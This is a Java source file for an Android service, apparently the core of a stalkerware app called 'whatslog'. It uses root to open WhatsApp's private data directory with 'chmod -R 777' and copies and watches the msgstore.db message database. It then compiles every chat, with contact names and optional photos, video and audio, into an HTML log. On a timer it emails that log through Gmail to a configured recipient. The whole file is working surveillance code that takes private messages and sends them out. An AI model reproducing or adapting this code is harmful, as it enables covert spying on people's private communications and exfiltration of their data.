package com.whatslog;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.sql.SQLException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;

import javax.mail.AuthenticationFailedException;
import javax.mail.MessagingException;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.AsyncTask;
import android.os.FileObserver;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

import com.gmailsender.GMailSender;
import com.j256.ormlite.dao.Dao;
import com.whatslog.dao.DatabaseHelperConfiguracao;
import com.whatslog.dao.DatabaseHelperExternal;
import com.whatslog.dao.DatabaseHelperInternal;
import com.whatslog.model.ChatList;
import com.whatslog.model.Configuracao;
import com.whatslog.model.Messages;

public class MainService extends Service {

	private FileObserver observer;
	private String pathToWatch;
	private Dao<Messages, Integer> daoMsgInternal;
	private Dao<Messages, Integer> daoMsgExternal;
	private Dao<ChatList, Integer> daoChatInternal;
	private Dao<ChatList, Integer> daoChatExternal;
	private ScheduledExecutorService scheduleTaskExecutor;
	private ScheduledFuture<?> scheduledFuture;
	private DatabaseHelperInternal internal;
	private DatabaseHelperExternal external;
	private Map<String, List<Messages>> listaMensagens;
	private GMailSender gmail;
	private Map<String, byte[]> anexos=new HashMap<String, byte[]>();
	private Configuracao configuracao;
	private final long MAX_SIZE=10485760;

	public MainService() {
	}

	@Override
	public IBinder onBind(Intent intent) {
		// TODO: Return the communication channel to the service.
		throw new UnsupportedOperationException("Not yet implemented");
	}

	private void chmod() {
		Process process = null;
		DataOutputStream dataOutputStream = null;
		try {
			process = Runtime.getRuntime().exec("su");
			dataOutputStream = new DataOutputStream(process.getOutputStream());
			dataOutputStream.writeBytes("chmod -R 777 "
					+ android.os.Environment.getDataDirectory().toString()
					+ "/data/com.whatsapp\n");
			dataOutputStream
					.writeBytes("chmod -R 777 "
							+ getApplicationContext().getPackageManager()
									.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
							+ "\n");

			dataOutputStream.writeBytes("exit\n");
			dataOutputStream.flush();
			process.waitFor();
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			try {
				if (dataOutputStream != null) {
					dataOutputStream.close();
				}
				process.destroy();
			} catch (Exception e) {
			}
		}
	}

	@Override
	public void onCreate() {

		Utils.verifyLicense(this);

		pathToWatch = android.os.Environment.getDataDirectory().toString()
				+ "/data/com.whatsapp/databases/msgstore.db";

		chmod();
		try {
			String inFileName = getApplicationContext().getPackageManager()
					.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
					+ "/databases/msgstore.db";

			File dest = new File(inFileName);

			if (!dest.exists()) {

				File source = new File(pathToWatch);
				try {

					File dir = new File(
							getApplicationContext().getPackageManager()
									.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
									+ "/databases/");
					if (!dir.exists())
						dir.mkdir();

					dest.createNewFile();
					Utils.copyFile(source, dest);
				} catch (IOException e) {
					e.printStackTrace();
				}
			}

		} catch (NameNotFoundException e) {
			e.printStackTrace();
		}

		startMail();
	}

	@Override
	public void onStart(Intent intent, int startId) {

		// final String pathToWatch =
		// android.os.Environment.getDataDirectory().toString()+"/data/com.whatsapp/databases/msgstore.db";

		internal = new DatabaseHelperInternal(getApplicationContext());
		external = new DatabaseHelperExternal(getApplicationContext());

		try {
			daoMsgInternal = internal.getMessagesDao();
			daoMsgExternal = external.getMessagesDao();
			daoChatInternal = internal.getChatDao();
			daoChatExternal = external.getChatDao();

		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		observer = new FileObserver(pathToWatch) { // set up a file observer to
													// watch this directory on
													// sd card

			@Override
			public void onEvent(int event, String file) {

				switch (event) {
				case FileObserver.MODIFY:
					Log.d("DEBUG", "MODIFY:" + pathToWatch + file);

					updateMsg();
					updateChat();
					break;
				default:
					// just ignore
					break;
				}

				// Toast.makeText(getBaseContext(), file + " was saved!",
				// Toast.LENGTH_LONG);
				// }
			}
		};
		observer.startWatching(); // START OBSERVING

		// For time consuming an long tasks you can launch a new thread here...
		Toast.makeText(this, " Service Started", Toast.LENGTH_LONG).show();
	}

	private void startMail(){

		scheduleTaskExecutor = Executors.newScheduledThreadPool(1);
		if(scheduledFuture!=null)
			scheduledFuture.cancel(true);

		scheduledFuture=scheduleTaskExecutor.scheduleAtFixedRate(new Runnable() {
			public void run() {
				prepare();
			}
		}, 0, getConfiguracao().getIntervalo() * 60, TimeUnit.SECONDS);

	}


	public Configuracao getConfiguracao() {
		if(configuracao==null){
			DatabaseHelperConfiguracao database = new DatabaseHelperConfiguracao(
					getApplicationContext());
			List<Configuracao> confs;
			try {
				confs = database.getDao().queryForAll();
				Configuracao conf = null;

				if (confs.size() > 0) {
					conf = confs.get(0);
				}
				if (conf != null) {
					configuracao=conf;
				}
			} catch (Exception e) {
			}
		}
		return configuracao;
	}


	@Override
	public void onDestroy() {
		Toast.makeText(this, "Service Destroyed", Toast.LENGTH_LONG).show();

	}

	private void updateMsg() {

		try {
			List<Messages> mensagens = daoMsgInternal.queryForAll();
			List<Messages> m = daoMsgExternal.queryForAll();
			Set<Messages> nova = new HashSet<Messages>();
			for (Messages mensagem : m) {

				if (!mensagens.contains(mensagem)) {
					nova.add(mensagem);
				}

			}

			for (Messages mensagem : nova) {
				try {
					daoMsgInternal.create(mensagem);
				} catch (SQLException e) {
					e.printStackTrace();
				}
			}

		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private void updateChat() {

		try {
			List<ChatList> chats = daoChatInternal.queryForAll();
			List<ChatList> m = daoChatExternal.queryForAll();
			Set<ChatList> nova = new HashSet<ChatList>();
			for (ChatList chat : m) {

				if (!chats.contains(chat)) {
					nova.add(chat);
				}

			}

			for (ChatList chat : nova) {
				try {
					daoChatInternal.create(chat);
				} catch (SQLException e) {
					e.printStackTrace();
				}
			}

		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private void prepare() {

		File outputDir = getApplicationContext().getCacheDir(); // context being
		try {
			gmail=new GMailSender(getApplicationContext());
			StringBuilder html = new StringBuilder();

			html.append(getChatList());
			html.append(loadMessages());


			File chatsFile=new File(outputDir, "logs_"+(new SimpleDateFormat("dd_MM_yyyy").format(new Date()))+".html");
			OutputStream output = new FileOutputStream(chatsFile);
			output.write(wrapHtml(html).toString().getBytes());
			output.flush();
			output.close();

			anexos.put(chatsFile.getName(),com.gmailsender.Utils.getBytes(chatsFile));
			if(Utils.isConnected(getApplicationContext()))
				new SendEmailAsyncTask().execute(anexos);

		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private StringBuilder wrapHtml(StringBuilder html) {
		StringBuilder tmp = new StringBuilder();

		tmp.append("<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta charset=\"utf-8\"><style>.clear{clear: both;}.device{font-weight: normal;font-style: italic;font-size:14px;text-align:right;}.date-divider{background: #fff;padding: 4px 7px;border: 1px solid #6ABA2F;margin: 15px 0 4px 0;}.date-divider a{text-decoration: none;}.eventtype{ margin-top: 6px; clear: both;}.contents{padding: 2px 8px 4px;    margin: 0;    clear: both;}.contents h3{    margin:6px 0;       font-size:14px;}.contents p{    margin-top: 0;}.econtent{    margin-bottom:4px;}.econtent img{    vertical-align:middle;}.t2, .t5, .t15{    margin-left:20%;    background-color: #fff;    box-shadow: -2px 1px 2px rgba(0, 0, 0, 0.6);    font: 15px Helvetica, Arial, sans-serif;    float: right;    padding: 0 4px;    position: relative;    border-width: 1px;    border-color: #309b19;    border-style: solid;    text-align: right;}.t1, .t3, .t4 {    margin-right: 20%;    background-color: #F5F5F5;    box-shadow: 2px 1px 2px rgba(0, 0, 0, 0.6);    font: 15px Helvetica, Arial, sans-serif;     float: left;    padding: 0 4px;    position: relative;    border-width: 1px;    border-color: #9DA0A6;    border-style: solid;}.arrow2, .arrow5, .arrow15{    float: right;    width:23px;    height:10px;    margin-top:-1px;    margin-right:10px;   background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAKCAYAAABfYsXlAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjhGMjZGMUREQ0I3NTExRTFCRjg1ODQxRUREMjNBOTE3IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjhGMjZGMURFQ0I3NTExRTFCRjg1ODQxRUREMjNBOTE3Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6OEYyNkYxREJDQjc1MTFFMUJGODU4NDFFREQyM0E5MTciIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6OEYyNkYxRENDQjc1MTFFMUJGODU4NDFFREQyM0E5MTciLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7tzfsZAAAAsUlEQVR42mI0mC35n4FGgEmRQ22lGJvkD1FWSaoa3KI8U5ER6HIQWxSIc6BYiApm5wLxFCYo5zUQ1wOxDBBnAfEdCgx+B8QLwMGCJvEdiKcDsSoQhwLxcTIMB+n/gs1wZLAGiK2geA2RBv8CBQc8QonQcBzqCw0gngX1HS4ACo4XpBgOAzeBOB2I5YG4CRq26GAiSlIkI0xxRf4mIL6GrJCFglQBi3wQDgHi++gKAAIMAK71JAwUWWlQAAAAAElFTkSuQmCC);}.arrow1, .arrow3, .arrow4{    width:23px;    height:10px;    margin-top:-1px;    margin-left:10px;    background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAKCAYAAABfYsXlAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjJFQTAwOEEzQ0I3NjExRTFBNTA5RTNBMUFGOTlFNEU2IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjJFQTAwOEE0Q0I3NjExRTFBNTA5RTNBMUFGOTlFNEU2Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6MkVBMDA4QTFDQjc2MTFFMUE1MDlFM0ExQUY5OUU0RTYiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6MkVBMDA4QTJDQjc2MTFFMUE1MDlFM0ExQUY5OUU0RTYiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6T0+uHAAAAWElEQVR42mKcMGHCfwYaASYWVuaptDD4P8P/f0x/fv/NoYXhjAyMzCw0MRcKWJAE/lPDQGTAQi1XYo1QYhViMZSgehZquhSfy/FpZiTVYEIuZ6Q02QAEGAC0LQraPP8eOQAAAABJRU5ErkJggg==);}.einfo a{    text-decoration: none;}.einfo img {vertical-align: top;}</style></head><body>")
		.append(html)
		.append("</body></html>");
		return tmp;
	}

	private StringBuilder getChatList() {
		StringBuilder chattmp = new StringBuilder();
		chattmp.append("<table  border=\"1\"><tr><td>Chats</td><td>Date</td><td>Last message</td></tr>");

		try {
			// DatabaseHelperInternal internal = new DatabaseHelperInternal(
			// getApplicationContext());
			List<ChatList> chats = internal.getChatDao().queryBuilder()
					.groupBy("key_remote_jid").query();
			int i = 0;
			for (ChatList chat : chats) {
				String nome = chat.getKey_remote_jid();

				try {

					nome = Utils.getContactDisplayNameByNumber(chat
							.getKey_remote_jid(), getApplication()
							.getContentResolver());

				} catch (Exception e){
					nome=chat.getSubject()!=null && chat.getSubject()!=""?chat.getSubject():chat.getKey_remote_jid();
				}

				//Messages me= internal.getMessagesDao().queryBuilder().orderBy("timestamp", false).where().eq("key_remote_jid", chat.getKey_remote_jid()).queryForFirst();
				Messages me=null;
				try{me=chat.getMensagens().get(0);}catch(Exception e){}
				String data="",msg="";
				if(me!=null){
					data=new SimpleDateFormat("dd/MM/yyyy hh:mm:ss").format(me.getTimestamp());
					msg=me.getData();
				}

				chattmp.append("<tr style=\""
						+ (i % 2 == 0 ? "background:#FCFFCD" : "")
						+ "\"><td><a href=\"#" + chat.getKey_remote_jid()
						+ "\">" + nome + "</a></td><td>"+data+"</td><td>"+msg+"</td></tr>");
				i++;
			}

		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		chattmp.append("</table>");
		return chattmp;

	}

	private StringBuilder loadMessages() {

		try {
			listaMensagens = new HashMap<String, List<Messages>>();
			List<Messages> mensagens = internal.getMessagesDao().queryForAll();

			for (Messages message : mensagens) {
				if(message.getChatList()!=null){
					String key=message.getChatList().getKey_remote_jid();
					if (!listaMensagens.containsKey(key)) {
						listaMensagens.put(key,
								new ArrayList<Messages>());
					}

					listaMensagens.get(key).add(message);
				}

			}

			StringBuilder tmp = new StringBuilder();

			Set<String> keys = listaMensagens.keySet();

			for (String key : keys) {
				tmp.append(getMessageList(key, listaMensagens.get(key)))
						.append("<br/>");
			}
			return tmp;
		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return new StringBuilder();

	}

	private StringBuilder getMessageList(String id, List<Messages> mensagens) {

		String nome = id;
		try {
			nome = Utils.getContactDisplayNameByNumber(id, getApplication()
					.getContentResolver());
		} catch (Exception e) {
		}

		StringBuilder tmp = new StringBuilder();
		tmp.append("<table id=\""
				+ id
				+ "\" colspan=\"1\" border=\"1\"><tr><th colspan=\"3\">Chat with "
				+ nome
				+ "</th></tr><tr><td>Date</td><td>Sender</td><td>Message</td></tr>");

		Collections.sort(mensagens);

		for (Messages message : mensagens) {
			String tmpcontato=nome;
			if (message.getKey_from_me() == 1)
				tmpcontato = "ME";


			String dado=getDado(message);

			tmp.append("<tr style=\""
					+ (message.getKey_from_me() == 0 ? "background:#FCFFCD" : "")
					+ "\"><td>"
					+ new SimpleDateFormat("dd/MM/yyyy HH:mm:ss")
							.format(message.getTimestamp()) + "</td><td>"
					+ tmpcontato + "</td><td>" + dado + "</td></tr>");
		}

		tmp.append("</table>");
		return tmp;

	}

	private String getDado(Messages message) {

		if (getConfiguracao().isMiniatura() && !getConfiguracao().isMedia()) {
			if (message.getRaw_data() != null)
				return "<img src=\"data:" + message.getMedia_mime_type()
						+ ";base64,"
						+ Utils.encodeBase64(message.getRaw_data()) + "\"/>";
		}

		if (getConfiguracao().isMedia()) {
			if(Long.parseLong(message.getMedia_size())<=MAX_SIZE){
			if (message.isImagem()) {
				String key = message.getMedia_url().split("/")[message
						.getMedia_url().split("/").length - 1];
				anexos.put(key, Utils.getMediaFile("Images", Long
						.parseLong(message.getMedia_size()),
						new SimpleDateFormat("yyyyMMdd").format(message
								.getTimestamp()), 2));
				return "<img src=\"" + key + "\"/>";
			}

			else if (message.isVideo()) {
				if (message.getRaw_data() != null) {
					String key = message.getMedia_url().split("/")[message
							.getMedia_url().split("/").length - 1];
					anexos.put(key, Utils.getMediaFile("Video", Long
							.parseLong(message.getMedia_size()),
							new SimpleDateFormat("yyyyMMdd").format(message
									.getTimestamp()), 2));
					return "<video width=\"220\" height=\"140\" controls> <source src=\""
							+ key
							+ "\" type=\""
							+ message.getMedia_mime_type()
							+ "\">Your browser does not support the video tag.</video>";
				}
			} else if (message.isAudio()) {
				if (message.getRaw_data() != null) {
					String key = message.getMedia_url().split("/")[message
							.getMedia_url().split("/").length - 1];
					anexos.put(key, Utils.getMediaFile("Audio", Long
							.parseLong(message.getMedia_size()),
							new SimpleDateFormat("yyyyMMdd").format(message
									.getTimestamp()), 2));
					return "<audio controls> <source src=\""
							+ key
							+ "\" type=\""
							+ message.getMedia_mime_type()
							+ "\">Your browser does not support the audio tag.</audio>";

				}
			}
			}else
				return "MEDIA TOO BIG";
		}
		return message.getData();
	}

	class SendEmailAsyncTask extends AsyncTask<Map<String, byte[]>, Void, Boolean> {

		public SendEmailAsyncTask() {
		}

		protected Boolean doInBackground(Map<String, byte[]>... anexos) {
			try {
				Map<String, byte[]> anexo=anexos[0];
				long tamanho=0;
				for (String key : anexo.keySet()) {
					byte[] arq=anexo.get(key);
					if(arq!=null){
						gmail.addAttachment(key, arq);
					}
				}
				gmail.sendMail(getConfiguracao().getSubject(), "Check the attached file", null, getConfiguracao().getEmailTo());

				return true;
			} catch (AuthenticationFailedException e) {
				Log.e(SendEmailAsyncTask.class.getName(), "Bad account details");
				e.printStackTrace();
				return false;
			} catch (MessagingException e) {
				e.printStackTrace();
				return false;
			} catch (Exception e) {
				e.printStackTrace();
				return false;
			}
		}
	}
}